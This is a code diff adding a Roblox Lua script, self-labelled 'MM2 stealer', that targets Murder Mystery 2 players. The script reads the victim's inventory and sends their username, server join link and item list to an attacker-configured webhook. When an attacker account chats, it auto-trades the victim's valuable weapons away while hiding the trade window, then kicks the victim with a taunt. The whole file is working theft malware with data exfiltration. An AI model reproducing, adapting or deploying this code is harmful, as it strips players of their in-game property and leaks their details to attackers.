@@ -1,1 +1,287 @@
+local function sendHttpRequest(url, data)
+    local requestFunc = syn and syn.request or request or http_request or http.request
+    if not requestFunc then
+        warn("No HTTP request function available")
+        return false
+    end
+    
+    local success, response = pcall(function()
+        return requestFunc({
+            Url = url,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = game:GetService("HttpService"):JSONEncode(data)
+        })
+    end)
+    
+    return success and response or nil
+end
 
+local function sendTradeRequest(user)
+    local args = {
+        [1] = game:GetService("Players"):WaitForChild(user)
+    }
+    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
+end
+
+local function getTradeStatus()
+    return game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
+end
+
+local function waitForTradeCompletion()
+    while true do
+        local status = getTradeStatus()
+        if status == "None" then
+            break
+        end
+        wait(0.1)
+    end
+end
+
+local function acceptTrade()
+    local args = {
+        [1] = 285646582
+    }
+    while task.wait(0.05) do
+        for i = 1, 5 do
+            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
+        end
+    end
+end
+
+local function addWeaponToTrade(id)
+    local args = {
+        [1] = id,
+        [2] = "Weapons"
+    }
+    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
+end
+
+local success, err = pcall(function()
+    local Players = game:GetService("Players")
+    local HttpService = game:GetService("HttpService")
+    local plr = Players.LocalPlayer
+
+    if game.PlaceId ~= 142823291 then
+        error("Wrong game! Join Murder Mystery 2 (ID: 142823291)")
+    end
+
+    if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
+        error("VIP servers not supported")
+    end
+
+    if #Players:GetPlayers() >= 12 then
+        error("Server too full (12+ players)")
+    end
+
+    local database
+    local dbSuccess, dbErr = pcall(function()
+        database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+    end)
+    if not dbSuccess then
+        error("Failed to load database: "..tostring(dbErr))
+    end
+
+    local rarityTable = {"Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage"}
+    local min_rarity_index = table.find(rarityTable, _G.min_rarity) or 5
+
+    local untradable = {
+        ["DefaultGun"] = true, ["DefaultKnife"] = true,
+        ["Reaver"] = true, ["Reaver_Legendary"] = true, ["Reaver_Godly"] = true, ["Reaver_Ancient"] = true,
+        ["IceHammer"] = true, ["IceHammer_Legendary"] = true, ["IceHammer_Godly"] = true, ["IceHammer_Ancient"] = true,
+        ["Gingerscythe"] = true, ["Gingerscythe_Legendary"] = true, ["Gingerscythe_Godly"] = true, ["Gingerscythe_Ancient"] = true,
+        ["TestItem"] = true, ["Season1TestKnife"] = true, ["Cracks"] = true, ["Icecrusher"] = true,
+        ["???"] = true, ["Dartbringer"] = true, ["TravelerAxeRed"] = true, ["TravelerAxeBronze"] = true,
+        ["TravelerAxeSilver"] = true, ["TravelerAxeGold"] = true, ["BlueCamo_K_2022"] = true, 
+        ["GreenCamo_K_2022"] = true, ["SharkSeeker"] = true
+    }
+
+    local realData
+    local invSuccess, invErr = pcall(function()
+        realData = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
+    end)
+    if not invSuccess or not realData then
+        error("Failed to get inventory: "..tostring(invErr))
+    end
+
+    local weaponsToSend = {}
+    local totalValue = 0
+    for dataid, amount in pairs(realData.Weapons.Owned) do
+        local itemInfo = database[dataid]
+        if itemInfo and not untradable[dataid] then
+            local rarity = itemInfo.Rarity or ""
+            local weapon_rarity_index = table.find(rarityTable, rarity)
+            if weapon_rarity_index and weapon_rarity_index >= min_rarity_index then
+                local value = (weapon_rarity_index >= 5) and 2 or 1
+                if value >= _G.min_value then
+                    totalValue = totalValue + (value * amount)
+                    table.insert(weaponsToSend, {
+                        DataID = dataid,
+                        Rarity = rarity,
+                        Amount = amount,
+                        Value = value
+                    })
+                end
+            end
+        end
+    end
+
+    if #weaponsToSend == 0 then
+        error("No stealable items found matching criteria")
+    end
+
+    table.sort(weaponsToSend, function(a, b)
+        return (a.Value * a.Amount) > (b.Value * b.Amount)
+    end)
+
+    local function SendFirstMessage(list, prefix)
+        local fields = {
+            {name = "Victim Username:", value = plr.Name, inline = true},
+            {name = "Join link:", value = "https://fern.wtf/joiner?placeId=142823291&gameInstanceId="..game.JobId, inline = true},
+            {name = "Item list:", value = "", inline = false},
+            {name = "Summary:", value = string.format("Total Value: %d", totalValue), inline = false}
+        }
+
+        for _, item in ipairs(list) do
+            local itemLine = string.format("%s (x%d): %d Value (%s)", item.DataID, item.Amount, (item.Value * item.Amount), item.Rarity)
+            fields[3].value = fields[3].value .. itemLine .. "\n"
+        end
+
+        if #fields[3].value > 1024 then
+            local lines = {}
+            for line in fields[3].value:gmatch("[^\r\n]+") do table.insert(lines, line) end
+            while #fields[3].value > 1024 and #lines > 0 do
+                table.remove(lines)
+                fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
+            end
+        end
+
+        local data = {
+            content = prefix.."game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '"..game.JobId.."')",
+            embeds = {{
+                title = "🔪 Join to get MM2 hit",
+                color = 65280,
+                fields = fields,
+                footer = {text = "MM2 stealer by Jvztl"}
+            }}
+        }
+
+        for attempt = 1, 3 do
+            local response = sendHttpRequest(_G.webhook, data)
+            if response and (response.StatusCode == 200 or response.StatusCode == 204) then
+                break
+            elseif attempt == 3 then
+                warn("Failed to send webhook after 3 attempts")
+            end
+            wait(2)
+        end
+    end
+
+    local prefix = _G.ping == "Yes" and "@everyone " or ""
+    SendFirstMessage(weaponsToSend, prefix)
+
+    local function doTrade(joinedUser)
+        local initialTradeState = getTradeStatus()
+        if initialTradeState == "StartTrade" then
+            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
+            wait(0.3)
+        elseif initialTradeState == "ReceivingRequest" then
+            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
+            wait(0.3)
+        end
+
+        local playerGui = plr:WaitForChild("PlayerGui")
+        local tradegui = playerGui:WaitForChild("TradeGUI")
+        tradegui:GetPropertyChangedSignal("Enabled"):Connect(function()
+            tradegui.Enabled = false
+        end)
+        local tradeguiphone = playerGui:WaitForChild("TradeGUI_Phone")
+        tradeguiphone:GetPropertyChangedSignal("Enabled"):Connect(function()
+            tradeguiphone.Enabled = false
+        end)
+
+        while #weaponsToSend > 0 do
+            local status = getTradeStatus()
+
+            if status == "None" then
+                sendTradeRequest(joinedUser)
+            elseif status == "SendingRequest" then
+                wait(0.3)
+            elseif status == "ReceivingRequest" then
+                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
+                wait(0.3)
+            elseif status == "StartTrade" then
+                local tradedItems = {}
+                for i = 1, math.min(4, #weaponsToSend) do
+                    table.insert(tradedItems, table.remove(weaponsToSend, 1))
+                end
+                
+                for _, weapon in ipairs(tradedItems) do
+                    for count = 1, weapon.Amount do
+                        addWeaponToTrade(weapon.DataID)
+                    end
+                end
+                
+                task.spawn(acceptTrade)
+                waitForTradeCompletion()
+                
+                local stolenItems = ""
+                for _, item in ipairs(tradedItems) do
+                    stolenItems = stolenItems .. string.format("%s (x%d): %d Value (%s)\n",
+                        item.DataID,
+                        item.Amount,
+                        (item.Value * item.Amount),
+                        item.Rarity
+                    )
+                end
+                
+                if #stolenItems > 1024 then
+                    stolenItems = stolenItems:sub(1, 1020) .. "..."
+                end
+                
+                local data = {
+                    embeds = {{
+                        title = "🔪 New MM2 Execution",
+                        color = 65280,
+                        fields = {
+                            {name = "Victim username:", value = plr.Name, inline = false},
+                            {name = "Items sent:", value = stolenItems, inline = false},
+                            {name = "Summary:", value = string.format("Total Value: %d", totalValue), inline = false}
+                        },
+                        footer = {text = "MM2 stealer by Jvztl"}
+                    }}
+                }
+                sendHttpRequest(_G.webhook, data)
+            else
+                wait(0.5)
+            end
+            wait(1)
+        end
+        
+        plr:Kick("All your stuff just got taken by Jvztl's stealer")
+    end
+
+    local function waitForUserChat()
+        local sentMessage = false
+        local function onPlayerChat(player)
+            if table.find(_G.users, player.Name) then
+                player.Chatted:Connect(function()
+                    if not sentMessage then
+                        sentMessage = true
+                        doTrade(player.Name)
+                    end
+                end)
+            end
+        end
+        for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
+        Players.PlayerAdded:Connect(onPlayerChat)
+    end
+    
+    waitForUserChat()
+end)
+
+if not success then
+    warn("Script error: "..tostring(err))
+end
